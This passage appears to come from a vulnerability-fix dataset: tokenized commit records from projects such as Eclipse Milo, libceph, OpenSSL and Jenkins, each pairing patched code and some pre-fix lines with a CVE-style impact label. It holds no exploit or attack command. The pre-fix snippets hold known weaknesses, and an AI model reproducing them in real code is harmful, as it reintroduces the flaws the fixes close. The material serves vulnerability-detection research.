"session", ".", "setServerNonce", "(", "asrNonce", ")", ";", "return", "completedFuture", "(", "session", ")", ";", "}", "catch", "(", "UaException", "e", ")", "{", "return", "failedFuture", "(", "e", ")", ";", "}", "NonceUtil", ".", "validateNonce", "(", "clientNonce", ")", ";", "NonceUtil", ".", "validateNonce", "(", "oscr", ".", "getServerNonce", "(", "),", "secureChannel", ".", "getSecurityPolicy", "(", "))", ";", "import", "org", ".", "bouncycastle", ".", "util", ".", "Arrays", ";", "import", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "StatusCodes", ";", "import", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "UaException", ";", "/", "**", "*", "The", "minimum", "required", "nonce", "length", "for", "validation", "by", "{", "@", "link", "NonceUtil", "#", "validateNonce", "(", "ByteString", ")", "}.", "*", "<", "p", ">", "*", "This", "is", "specified", "by", "OPC", "UA", "Part", "4", "to", "be", "least", "32", "bytes", "in", "the", "CreateSession", "and", "ActivateSession", "services", ".", "*", "/", "public", "static", "final", "int", "MINIMUM_NONCE_LENGTH", "=", "32", ";", "*", "<", "b", ">", "Important", "<", "/", "b", ">", ":", "this", "should", "only", "be", "used", "to", "generate", "a", "nonce", "exchanged", "when", "establishing", "a", "secure", "channel", ".", "*", "The", "nonce", "used", "by", "sessions", "has", "different", "length", "requirements", ".", "*", "private", "static", "int", "getNonceLength", "(", "SecurityPolicy", "securityPolicy", ")", "{", "/", "**", "*", "Validate", "that", "{", "@", "code", "nonce", "}", "meets", "the", "minimum", "length", "requirement", "for", "{", "@", "code", "securityPolicy", "}", "and", "is", "non", "-", "zeroes", ".", "*", "<", "p", ">", "*", "<", "b", ">", "Important", "<", "/", "b", ">", ":", "this", "should", "only", "be", "used", "to", "validate", "the", "nonce", "exchanged", "when", "establishing", "a", "secure", "channel", ".", "*", "The", "nonce", "used", "by", "sessions", "has", "different", "length", "requirements", ".", "*", "*", "@", "param", "nonce", "the", "nonce", "to", "validate", ".", "*", "@", "param", "securityPolicy", "the", "{", "@", "link", "SecurityPolicy", "}", "dictating", "the", "minimum", "nonce", "length", ".", "*", "@", "throws", "UaException", "if", "nonce", "validation", "failed", ".", "*", "/", "public", "static", "void", "validateNonce", "(", "ByteString", "nonce", ",", "SecurityPolicy", "securityPolicy", ")", "throws", "UaException", "{", "validateNonce", "(", "nonce", ",", "getNonceLength", "(", "securityPolicy", ")", ");", "}", "/", "**", "*", "Validate", "that", "{", "@", "code", "nonce", "}", "is", "at", "least", "{", "@", "link", "NonceUtil", "#", "MINIMUM_NONCE_LENGTH", "}", "and", "is", "non", "-", "zeroes", ".", "*", "*", "@", "param", "nonce", "the", "nonce", "to", "validate", ".", "*", "@", "throws", "UaException", "if", "nonce", "validation", "failed", ".", "*", "/", "public", "static", "void", "validateNonce", "(", "ByteString", "nonce", ")", "throws", "UaException", "{", "validateNonce", "(", "nonce", ",", "MINIMUM_NONCE_LENGTH", ")", ";", "}", "/", "**", "*", "Validate", "that", "{", "@", "code", "nonce", "}", "is", "at", "least", "{", "@", "code", "minimumLength", "}", "and", "is", "non", "-", "zeroes", ".", "*", "*", "@", "param", "nonce", "the", "nonce", "to", "validate", ".", "*", "@", "param", "minimumLength", "the", "minimum", "required", "nonce", "length", "*", "@", "throws", "UaException", "if", "nonce", "validation", "failed", ".", "*", "/", "public", "static", "void", "validateNonce", "(", "ByteString", "nonce", ",", "int", "minimumLength", ")", "throws", "UaException", "{", "byte", "[", "]", "bs", "=", "nonce", ".", "bytesOrEmpty", "(", ");", "if", "(", "bs", ".", "length", "<", "minimumLength", ")", "{", "throw", "new", "UaException", "(", "StatusCodes", ".", "Bad_NonceInvalid", ",", "\"", "nonce", "must", "be", "at", "least", "\"", "+", "minimumLength", "+", "\"", "bytes", "\"", ")", ";", "}", "if", "(", "bs", ".", "length", ">", "0", "&", "&", "Arrays", ".", "areAllZeroes", "(", "bs", ",", "0", ",", "bs", ".", "length", ")", ")", "{", "throw", "new", "UaException", "(", "StatusCodes", ".", "Bad_NonceInvalid", ",", "\"", "nonce", "must", "be", "non", "-", "zero", "\"", ");", "}", "}", "/", "*", "*", "Copyright", "(", "c", ")", "2019", "the", "Eclipse", "Milo", "Authors", "*", "*", "This", "program", "and", "the", "accompanying", "materials", "are", "made", "*", "available", "under", "the", "terms", "of", "the", "Eclipse", "Public", "License", "2", ".", "0", "*", "which", "is", "available", "at", "https", ":", "//", "www", ".", "eclipse", ".", "org", "/", "legal", "/", "epl", "-", "2", ".", "0", "/", "*", "*", "SPDX", "-", "License", "-", "Identifier", ":", "EPL", "-", "2", ".", "0", "*", "/", "package", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "util", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "UaException", ";", "import", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "security", ".", "SecurityPolicy", ";", "import", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "types", ".", "builtin", ".", "ByteString", ";", "import", "org", ".", "testng", ".", "annotations", ".", "Test", ";", "import", "static", "org", ".", "testng", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "testng", ".", "Assert", ".", "assertThrows", ";", "public", "class", "NonceUtilTest", "{", "@", "Test", "public", "void", "testSecureChannelNonceGeneration", "(", ")", "{", "for", "(", "SecurityPolicy", "securityPolicy", ":", "SecurityPolicy", ".", "values", "(", "))", "{", "ByteString", "nonce", "=", "NonceUtil", ".", "generateNonce", "(", "securityPolicy", ")", ";", "switch", "(", "securityPolicy", ")", "{", "case", "None", ":", "assertEquals", "(", "nonce", ".", "length", "(", "),", "0", ")", ";", "break", ";", "case", "Basic128Rsa15", ":", "assertEquals", "(", "nonce", ".", "length", "(", "),", "16", ")", ";", "break", ";", "default", ":", "assertEquals", "(", "nonce", ".", "length", "(", "),", "32", ")", ";", "}", "}", "}", "@", "Test", "public", "void", "testNonceGeneration", "(", ")", "throws", "UaException", "{", "for", "(", "int", "i", "=", "32", ";", "i", "<", "256", ";", "i", "+", "+)", "{", "ByteString", "nonce", "=", "NonceUtil", ".", "generateNonce", "(", "i", ")", ";", "assertEquals", "(", "nonce", ".", "length", "(", "),", "i", ")", ";", "NonceUtil", ".", "validateNonce", "(", "nonce", ")", ";", "}", "}", "@", "Test", "public", "void", "testShortNonceThrows", "(", ")", "{", "ByteString", "nonce", "=", "NonceUtil", ".", "generateNonce", "(", "NonceUtil", ".", "MINIMUM_NONCE_LENGTH", "-", "1", ")", ";", "assertThrows", "(", "()", "-", ">", "NonceUtil", ".", "validateNonce", "(", "nonce", ")", ");", "}", "@", "Test", "public", "void", "testNonceOfZeroesThrows", "(", ")", "{", "byte", "[", "]", "bs", "=", "new", "byte", "[", "NonceUtil", ".", "MINIMUM_NONCE_LENGTH", "]", ";", "Arrays", ".", "fill", "(", "bs", ",", "(", "byte", ")", "0", ")", ";", "ByteString", "nonce", "=", "ByteString", ".", "of", "(", "bs", ")", ";", "assertThrows", "(", "()", "-", ">", "NonceUtil", ".", "validateNonce", "(", "nonce", ")", ");", "}", "@", "Test", "public", "void", "testZeroLengthNonceValidation", "(", ")", "throws", "UaException", "{", "/", "/", "an", "empty", "nonce", "is", "valid", "in", "the", "secure", "channel", "layer", "when", "no", "security", "is", "used", ".", "NonceUtil", ".", "validateNonce", "(", "ByteString", ".", "of", "(", "new", "byte", "[", "0", "]", "),", "0", ")", ";", "}", "}", "@", "@", "-", "58", ",", "13", "+", "58", ",", "13", "@", "@", "import", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "util", ".", "NonceUtil", ";", "NonceUtil", ".", "validateNonce", "(", "remoteNonce", ",", "secureChannel", ".", "getSecurityPolicy", "(", "))", ";</s>import", "java", ".", "util", ".", "Optional", ";", "byte", "[", "]", "nonceBytes", "=", "Optional", ".", "ofNullable", "(", "serverNonce", ".", "bytes", "(", "))", ".", "orElse", "(", "new", "byte", "[", "0", "]", ");", "ByteString", "serverNonce", "=", "csr", ".", "getServerNonce", "(", ");", ".", "getIdentityToken", "(", "endpoint", ",", "serverNonce", ")", ";", "buildClientSignature", "(", "client", ".", "getConfig", "(", "),", "serverNonce", ")", ",", "OpcUaSession", "session", "=", "new", "OpcUaSession", "(", "csr", ".", "getAuthenticationToken", "(", "),", "csr", ".", "getSessionId", "(", "),", "client", ".", "getConfig", "(", ").", "getSessionName", "(", ").", "get", "(", "),", "csr", ".", "getRevisedSessionTimeout", "(", "),", "csr", ".", "getMaxRequestMessageSize", "(", "),", "csr", ".", "getServerCertificate", "(", "),", "csr", ".", "getServerSoftwareCertificates", "(", ")", ")", ";", "session", ".", "setServerNonce", "(", "asr", ".", "getServerNonce", "(", "))", ";", "return", "completedFuture", "(", "session", ")", ";", "if", "(", "clientNonce", ".", "isNotNull", "(", ")", "&", "&", "(", "clientNonce", ".", "length", "(", ")", "<", "32", ")", ")", "{", "throw", "new", "UaException", "(", "StatusCodes", ".", "Bad_NonceInvalid", ")", ";", "}", "public", "static", "int", "getNonceLength", "(", "SecurityPolicy", "securityPolicy", ")", "{", "import", "static", "org", ".", "eclipse", ".", "milo", ".", "opcua", ".", "stack", ".", "core", ".", "util", ".", "NonceUtil", ".", "getNonceLength", ";", "if", "(", "remoteNonce", "=", "=", "null", "|", "|", "remoteNonce", ".", "isNull", "(", "))", "{", "throw", "new", "UaException", "(", "StatusCodes", ".", "Bad_SecurityChecksFailed", ",", "\"", "remote", "nonce", "must", "be", "non", "-", "null", "\"", ");", "}", "if", "(", "remoteNonce", ".", "length", "(", ")", "<", "getNonceLength", "(", "secureChannel", ".", "getSecurityPolicy", "(", "))", ")", "{", "String", "message", "=", "String", ".", "format", "(", "\"", "remote", "nonce", "length", "must", "be", "at", "least", "%", "d", "bytes", "\"", ",", "getNonceLength", "(", "secureChannel", ".", "getSecurityPolicy", "(", "))", ");", "throw", "new", "UaException", "(", "StatusCodes", ".", "Bad_SecurityChecksFailed", ",", "message", ")", ";", "}"], "docstring_tokens": ["reuse", "encrypted", "user", "credentials", "sent", "over", "the", "network", "."]}
{"contents": ["libceph:", "introduce", "ceph_crypt()", "for", "in-place", "en/decryption", "Starting", "with", "4.9,", "kernel", "stacks", "may", "be", "vmalloced", "and", "therefore", "not", "guaranteed", "to", "be", "physically", "contiguous;", "the", "new", "CONFIG_VMAP_STACK", "option", "is", "enabled", "by", "default", "on", "x86.", "This", "makes", "it", "invalid", "to", "use", "on-stack", "buffers", "with", "the", "crypto", "scatterlist", "API,", "as", "sg_set_buf()", "expects", "a", "logical", "address", "and", "won't", "work", "with", "vmalloced", "addresses.", "There", "isn't", "a", "different", "(e.g.", "kvec-based)", "crypto", "API", "we", "could", "switch", "net/ceph/crypto.c", "to", "and", "the", "current", "scatterlist.h", "API", "isn't", "getting", "updated", "to", "accommodate", "this", "use", "case.", "Allocating", "a", "new", "header", "and", "padding", "for", "each", "operation", "is", "a", "non-starter,", "so", "do", "the", "en/decryption", "in-place", "on", "a", "single", "pre-assembled", "(header", "+", "data", "+", "padding)", "heap", "buffer.", "This", "is", "explicitly", "supported", "by", "the", "crypto", "API:", "\"...", "the", "caller", "may", "provide", "the", "same", "scatter/gather", "list", "for", "the", "plaintext", "and", "cipher", "text.", "After", "the", "completion", "of", "the", "cipher", "operation,", "the", "plaintext", "data", "is", "replaced", "with", "the", "ciphertext", "data", "in", "case", "of", "an", "encryption", "and", "vice", "versa", "for", "a", "decryption.\"", "Signed-off-by:", "Ilya", "Dryomov", "<idryomov@gmail.com>", "Reviewed-by:", "Sage", "Weil", "<sage@redhat.com>"], "code_tokens": ["static", "int", "ceph_aes_crypt", "(", "const", "struct", "ceph_crypto_key", "*", "key", ",", "bool", "encrypt", ",", "void", "*", "buf", ",", "int", "buf_len", ",", "int", "in_len", ",", "int", "*", "pout_len", ")", "{", "struct", "crypto_skcipher", "*", "tfm", "=", "ceph_crypto_alloc_cipher", "(", ");", "SKCIPHER_REQUEST_ON_STACK", "(", "req", ",", "tfm", ")", ";", "struct", "sg_table", "sgt", ";", "struct", "scatterlist", "prealloc_sg", ";", "char", "iv", "[", "AES_BLOCK_SIZE", "]", ";", "int", "pad_byte", "=", "AES_BLOCK_SIZE", "-", "(", "in_len", "&", "(", "AES_BLOCK_SIZE", "-", "1", ")", ");", "int", "crypt_len", "=", "encrypt", "?", "in_len", "+", "pad_byte", ":", "in_len", ";", "int", "ret", ";", "if", "(", "IS_ERR", "(", "tfm", ")", ")", "return", "PTR_ERR", "(", "tfm", ")", ";", "WARN_ON", "(", "crypt_len", ">", "buf_len", ")", ";", "if", "(", "encrypt", ")", "memset", "(", "buf", "+", "in_len", ",", "pad_byte", ",", "pad_byte", ")", ";", "ret", "=", "setup_sgtable", "(", "&", "sgt", ",", "&", "prealloc_sg", ",", "buf", ",", "crypt_len", ")", ";", "if", "(", "ret", ")", "goto", "out_tfm", ";", "crypto_skcipher_setkey", "(", "(", "void", "*", ")", "tfm", ",", "key", "-", ">", "key", ",", "key", "-", ">", "len", ")", ";", "memcpy", "(", "iv", ",", "aes_iv", ",", "AES_BLOCK_SIZE", ")", ";", "skcipher_request_set_tfm", "(", "req", ",", "tfm", ")", ";", "skcipher_request_set_callback", "(", "req", ",", "0", ",", "NULL", ",", "NULL", ")", ";", "skcipher_request_set_crypt", "(", "req", ",", "sgt", ".", "sgl", ",", "sgt", ".", "sgl", ",", "crypt_len", ",", "iv", ")", ";", "/", "*", "print_hex_dump", "(", "KERN_ERR", ",", "\"", "key", ":", "\"", ",", "DUMP_PREFIX_NONE", ",", "16", ",", "1", ",", "key", "-", ">", "key", ",", "key", "-", ">", "len", ",", "1", ")", ";", "print_hex_dump", "(", "KERN_ERR", ",", "\"", "in", ":", "\"", ",", "DUMP_PREFIX_NONE", ",", "16", ",", "1", ",", "buf", ",", "crypt_len", ",", "1", ")", ";", "*", "/", "if", "(", "encrypt", ")", "ret", "=", "crypto_skcipher_encrypt", "(", "req", ")", ";", "else", "ret", "=", "crypto_skcipher_decrypt", "(", "req", ")", ";", "skcipher_request_zero", "(", "req", ")", ";", "if", "(", "ret", ")", "{", "pr_err", "(", "\"%", "s", "%", "scrypt", "failed", ":", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "encrypt", "?", "\"", "en", "\"", ":", "\"", "de", "\"", ",", "ret", ")", ";", "goto", "out_sgt", ";", "}", "/", "*", "print_hex_dump", "(", "KERN_ERR", ",", "\"", "out", ":", "\"", ",", "DUMP_PREFIX_NONE", ",", "16", ",", "1", ",", "buf", ",", "crypt_len", ",", "1", ")", ";", "*", "/", "if", "(", "encrypt", ")", "{", "*", "pout_len", "=", "crypt_len", ";", "}", "else", "{", "pad_byte", "=", "*", "(", "char", "*", ")(", "buf", "+", "in_len", "-", "1", ")", ";", "if", "(", "pad_byte", ">", "0", "&", "&", "pad_byte", "<", "=", "AES_BLOCK_SIZE", "&", "&", "in_len", ">", "=", "pad_byte", ")", "{", "*", "pout_len", "=", "in_len", "-", "pad_byte", ";", "}", "else", "{", "pr_err", "(", "\"%", "s", "got", "bad", "padding", "%", "d", "on", "in_len", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "pad_byte", ",", "in_len", ")", ";", "ret", "=", "-", "EPERM", ";", "goto", "out_sgt", ";", "}", "}", "out_sgt", ":", "teardown_sgtable", "(", "&", "sgt", ")", ";", "out_tfm", ":", "crypto_free_skcipher", "(", "tfm", ")", ";", "return", "ret", ";", "}", "int", "ceph_crypt", "(", "const", "struct", "ceph_crypto_key", "*", "key", ",", "bool", "encrypt", ",", "void", "*", "buf", ",", "int", "buf_len", ",", "int", "in_len", ",", "int", "*", "pout_len", ")", "{", "switch", "(", "key", "-", ">", "type", ")", "{", "case", "CEPH_CRYPTO_NONE", ":", "*", "pout_len", "=", "in_len", ";", "return", "0", ";", "case", "CEPH_CRYPTO_AES", ":", "return", "ceph_aes_crypt", "(", "key", ",", "encrypt", ",", "buf", ",", "buf_len", ",", "in_len", ",", "pout_len", ")", ";", "default", ":", "return", "-", "ENOTSUPP", ";", "}", "}", "int", "ceph_crypt", "(", "const", "struct", "ceph_crypto_key", "*", "key", ",", "bool", "encrypt", ",", "void", "*", "buf", ",", "int", "buf_len", ",", "int", "in_len", ",", "int", "*", "pout_len", ")", ";</s>"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(system", "crash", "or", "memory", "corruption", ")", "or", "possibly", "have", "unspecified", "other", "impact"]}
{"contents": ["HV-912", "Wrapping", "invocation", "of", "ClassMate", "method", "into", "privileged", "action"], "code_tokens": ["import", "java", ".", "security", ".", "AccessController", ";", "import", "java", ".", "security", ".", "PrivilegedAction", ";", "import", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "privilegedactions", ".", "GetResolvedMemberMethods", ";", "/", "/", "ClassMate", "itself", "doesn", "'", "t", "require", "any", "special", "permissions", ",", "but", "it", "invokes", "reflection", "APIs", "which", "do", ".", "/", "/", "Wrapping", "the", "call", "into", "a", "privileged", "action", "to", "avoid", "that", "all", "calling", "code", "bases", "need", "to", "have", "the", "required", "/", "/", "permission", "ResolvedMethod", "[", "]", "resolvedMethods", "=", "run", "(", "GetResolvedMemberMethods", ".", "action", "(", "typeWithMembers", ")", ")", ";", "/", "**", "*", "Runs", "the", "given", "privileged", "action", ",", "using", "a", "privileged", "block", "if", "required", ".", "*", "<", "p", ">", "*", "<", "b", ">", "NOTE", ":", "</", "b", ">", "This", "must", "never", "be", "changed", "into", "a", "publicly", "available", "method", "to", "avoid", "execution", "of", "arbitrary", "*", "privileged", "actions", "within", "HV", "'", "s", "protection", "domain", ".", "*", "/", "private", "<", "T", ">", "T", "run", "(", "PrivilegedAction", "<", "T", ">", "action", ")", "{", "return", "System", ".", "getSecurityManager", "(", ")", "!", "=", "null", "?", "AccessController", ".", "doPrivileged", "(", "action", ")", ":", "action", ".", "run", "(", ");", "}", "/", "*", "*", "JBoss", ",", "Home", "of", "Professional", "Open", "Source", "*", "Copyright", "2014", ",", "Red", "Hat", ",", "Inc", ".", "and", "/", "or", "its", "affiliates", ",", "and", "individual", "contributors", "*", "by", "the", "@", "authors", "tag", ".", "See", "the", "copyright", ".", "txt", "in", "the", "distribution", "for", "a", "*", "full", "listing", "of", "individual", "contributors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "hibernate", ".", "validator", ".", "internal", ".", "util", ".", "privilegedactions", ";", "import", "java", ".", "security", ".", "PrivilegedAction", ";", "import", "com", ".", "fasterxml", ".", "classmate", ".", "ResolvedTypeWithMembers", ";", "import", "com", ".", "fasterxml", ".", "classmate", ".", "members", ".", "ResolvedMethod", ";", "/", "**", "*", "Returns", "the", "member", "methods", "-", "with", "resolved", "type", "parameters", "-", "of", "a", "given", "type", ".", "*", "*", "@", "author", "Gunnar", "Morling", "*", "/", "public", "final", "class", "GetResolvedMemberMethods", "implements", "PrivilegedAction", "<", "ResolvedMethod", "[", "]>", "{", "private", "final", "ResolvedTypeWithMembers", "type", ";", "public", "static", "GetResolvedMemberMethods", "action", "(", "ResolvedTypeWithMembers", "type", ")", "{", "return", "new", "GetResolvedMemberMethods", "(", "type", ")", ";", "}", "private", "GetResolvedMemberMethods", "(", "ResolvedTypeWithMembers", "type", ")", "{", "this", ".", "type", "=", "type", ";", "}", "@", "Override", "public", "ResolvedMethod", "[", "]", "run", "(", ")", "{", "return", "type", ".", "getMemberMethods", "(", ");", "}", "}</s>ResolvedMethod", "[", "]", "resolvedMethods", "=", "typeWithMembers", ".", "getMemberMethods", "(", ");"], "docstring_tokens": ["execute", "restricted", "reflection", "calls", "on", "the", "system"]}
{"contents": ["Prevent", "XXE", "vulnerability", "DEVSIX-1273"], "code_tokens": ["import", "org", ".", "xml", ".", "sax", ".", "EntityResolver", ";", "import", "java", ".", "io", ".", "StringReader", ";", "db", ".", "setEntityResolver", "(", "new", "SafeEmptyEntityResolver", "(", "))", ";", "db", ".", "setEntityResolver", "(", "new", "SafeEmptyEntityResolver", "(", "))", ";", "/", "/", "Prevents", "XXE", "attacks", "private", "static", "class", "SafeEmptyEntityResolver", "implements", "EntityResolver", "{", "public", "InputSource", "resolveEntity", "(", "String", "publicId", ",", "String", "systemId", ")", "throws", "SAXException", ",", "IOException", "{", "return", "new", "InputSource", "(", "new", "StringReader", "(", "\"\"", "))", ";", "}", "}", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "xml", ".", "sax", ".", "EntityResolver", ";", "import", "org", ".", "xml", ".", "sax", ".", "InputSource", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "io", ".", "OutputStream", ";", "import", "java", ".", "io", ".", "StringReader", ";", "try", "{", "tFactory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "tFactory", ".", "setAttribute", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_STYLESHEET", ",", "\"", "\")", ";", "}", "catch", "(", "Exception", "exc", ")", "{", "}", "db", ".", "setEntityResolver", "(", "new", "SafeEmptyEntityResolver", "(", "))", ";", "/", "/", "Prevents", "XXE", "attacks", "private", "static", "class", "SafeEmptyEntityResolver", "implements", "EntityResolver", "{", "public", "InputSource", "resolveEntity", "(", "String", "publicId", ",", "String", "systemId", ")", "throws", "SAXException", ",", "IOException", "{", "return", "new", "InputSource", "(", "new", "StringReader", "(", "\"\"", "))", ";", "}", "}</s>import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "io", ".", "OutputStream", ";", "import", "org", ".", "w3c", ".", "dom", ".", "Document", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";"], "docstring_tokens": ["obtain", "sensitive", "information"]}
{"contents": ["crypto/evp:", "harden", "AEAD", "ciphers.", "Originally", "a", "crash", "in", "32-bit", "build", "was", "reported", "CHACHA20-POLY1305", "cipher.", "The", "crash", "is", "triggered", "by", "truncated", "packet", "and", "is", "result", "of", "excessive", "hashing", "to", "the", "edge", "of", "accessible", "memory.", "Since", "hash", "operation", "is", "read-only", "it", "is", "not", "considered", "to", "be", "exploitable", "beyond", "a", "DoS", "condition.", "Other", "ciphers", "were", "hardened.", "Thanks", "to", "Robert", "\u015awi\u0119cki", "for", "report.", "Reviewed-by:", "Rich", "Salz", "<rsalz@openssl.org>"], "code_tokens": ["if", "(", "len", "<", "EVP_GCM_TLS_EXPLICIT_IV_LEN", ")", "return", "0", ";", "if", "(", "!", "EVP_CIPHER_CTX_encrypting", "(", "c", ")", ")", "{", "if", "(", "len", "<", "EVP_GCM_TLS_TAG_LEN", ")", "return", "0", ";", "}", "if", "(", "len", "<", "EVP_CCM_TLS_EXPLICIT_IV_LEN", ")", "return", "0", ";", "if", "(", "!", "EVP_CIPHER_CTX_encrypting", "(", "c", ")", ")", "{", "if", "(", "len", "<", "cctx", "-", ">", "M", ")", "return", "0", ";", "}", "if", "(", "len", "<", "POLY1305_BLOCK_SIZE", ")", "return", "0", ";", "*", "merge", "record", "sequence", "number", "as", "per", "RFC7905</s>if", "(", "!", "EVP_CIPHER_CTX_encrypting", "(", "c", ")", ")", "if", "(", "!", "EVP_CIPHER_CTX_encrypting", "(", "c", ")", ")", "*", "merge", "record", "sequence", "number", "as", "per", "*", "draft", "-", "ietf", "-", "tls", "-", "chacha20", "-", "poly1305", "-", "03"], "docstring_tokens": ["perform", "an", "out-of-bounds", "read"]}
{"contents": ["[SECURITY-153]", "Hide", "references", "to", "inaccessible", "jobs", "in", "fingerprints."], "code_tokens": ["import", "hudson", ".", "remoting", ".", "Callable", ";", "import", "hudson", ".", "security", ".", "Permission", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "org", ".", "acegisecurity", ".", "AccessDeniedException", ";", "import", "org", ".", "acegisecurity", ".", "Authentication", ";", "*", "Such", "job", "could", "be", "since", "then", "removed", ",", "so", "there", "might", "not", "be", "a", "corresponding", "{", "@", "link", "Job", "}", ".", "*", "*", "@", "return", "A", "name", "of", "the", "job", "@", "Nonnull", "/", "**", "*", "Checks", "if", "the", "current", "user", "has", "permission", "to", "see", "this", "pointer", ".", "*", "@", "return", "{", "@", "code", "true", "}", "if", "the", "job", "exists", "and", "user", "has", "{", "@", "link", "Item", "#", "READ", "}", "permissions", "*", "or", "if", "the", "current", "user", "has", "{", "@", "link", "Jenkins", "#", "ADMINISTER", "}", "permissions", ".", "*", "If", "the", "job", "exists", ",", "but", "the", "current", "user", "has", "no", "permission", "to", "discover", "it", ",", "*", "{", "@", "code", "false", "}", "will", "be", "returned", ".", "*", "If", "the", "job", "has", "been", "deleted", "and", "the", "user", "has", "no", "{", "@", "link", "Jenkins", "#", "ADMINISTER", "}", "permissions", ",", "*", "it", "also", "returns", "{", "@", "code", "false", "}", "in", "order", "to", "avoid", "the", "job", "existence", "fact", "exposure", ".", "*", "/", "private", "boolean", "hasPermissionToDiscoverBuild", "(", ")", "{", "/", "/", "We", "expose", "the", "data", "to", "Jenkins", "administrators", "in", "order", "to", "/", "/", "let", "them", "manage", "the", "data", "for", "deleted", "jobs", "(", "also", "works", "for", "SYSTEM", ")", "final", "Jenkins", "instance", "=", "Jenkins", ".", "getInstance", "(", ");", "if", "(", "instance", "!", "=", "null", "&", "&", "instance", ".", "hasPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ")", "{", "return", "true", ";", "}", "return", "canDiscoverItem", "(", "name", ")", ";", "}", "*", "Such", "{", "@", "link", "Run", "}", "could", "be", "since", "then", "discarded", ".", "*", "@", "return", "A", "build", "number", "@", "Nonnull", "*", "if", "the", "file", "is", "apparently", "created", "outside", "Hudson", "or", "if", "the", "current", "*", "user", "has", "no", "permission", "to", "discover", "the", "job", ".", "if", "(", "original", "!", "=", "null", "&", "&", "original", ".", "hasPermissionToDiscoverBuild", "(", "))", "{", "return", "original", ";", "}", "return", "null", ";", "final", "Jenkins", "instance", "=", "Jenkins", ".", "getInstance", "(", ");", "if", "(", "instance", "=", "=", "null", ")", "{", "return", "r", ";", "}", "for", "(", "Entry", "<", "String", ",", "RangeSet", ">", "e", ":", "usages", ".", "entrySet", "(", "))", "{", "final", "String", "itemName", "=", "e", ".", "getKey", "(", ");", "if", "(", "instance", ".", "hasPermission", "(", "Jenkins", ".", "ADMINISTER", ")", "|", "|", "canDiscoverItem", "(", "itemName", ")", ")", "{", "r", ".", "add", "(", "new", "RangeItem", "(", "itemName", ",", "e", ".", "getValue", "(", "))", ");", "}", "}", "/", "**", "*", "Checks", "if", "the", "current", "user", "can", "Discover", "the", "item", ".", "*", "If", "yes", ",", "it", "may", "be", "displayed", "as", "a", "text", "in", "Fingerprint", "UIs", ".", "*", "@", "param", "fullName", "Full", "name", "of", "the", "job", "*", "@", "return", "{", "@", "code", "true", "}", "if", "the", "user", "can", "discover", "the", "item", "*", "/", "private", "static", "boolean", "canDiscoverItem", "(", "@", "Nonnull", "final", "String", "fullName", ")", "{", "final", "Jenkins", "jenkins", "=", "Jenkins", ".", "getInstance", "(", ");", "if", "(", "jenkins", "=", "=", "null", ")", "{", "return", "false", ";", "}", "/", "/", "Fast", "check", "to", "avoid", "security", "context", "switches", "Item", "item", "=", "null", ";", "try", "{", "item", "=", "jenkins", ".", "getItemByFullName", "(", "fullName", ")", ";", "}", "catch", "(", "AccessDeniedException", "ex", ")", "{", "/", "/", "ignore", ",", "we", "will", "fall", "-", "back", "later", "}", "if", "(", "item", "!", "=", "null", ")", "{", "return", "true", ";", "}", "/", "/", "Probably", "it", "failed", "due", "to", "the", "missing", "Item", ".", "DISCOVER", "/", "/", "We", "try", "to", "retrieve", "the", "job", "using", "SYSTEM", "user", "and", "to", "check", "permissions", "manually", ".", "final", "Authentication", "userAuth", "=", "Jenkins", ".", "getAuthentication", "(", ");", "final", "boolean", "[", "]", "res", "=", "new", "boolean", "[", "]", "{", "false", "}", ";", "ACL", ".", "impersonate", "(", "ACL", ".", "SYSTEM", ",", "new", "Runnable", "(", ")", "{", "@", "Override", "public", "void", "run", "(", ")", "{", "final", "Item", "itemBySystemUser", "=", "jenkins", ".", "getItemByFullName", "(", "fullName", ")", ";", "if", "(", "itemBySystemUser", "=", "=", "null", ")", "{", "return", ";", "}", "/", "/", "To", "get", "the", "item", "existence", "fact", ",", "a", "user", "needs", "Item", ".", "DISCOVER", "for", "the", "item", "/", "/", "and", "Item", ".", "READ", "for", "all", "container", "folders", ".", "boolean", "canDiscoverTheItem", "=", "itemBySystemUser", ".", "getACL", "(", ").", "hasPermission", "(", "userAuth", ",", "Item", ".", "DISCOVER", ")", ";", 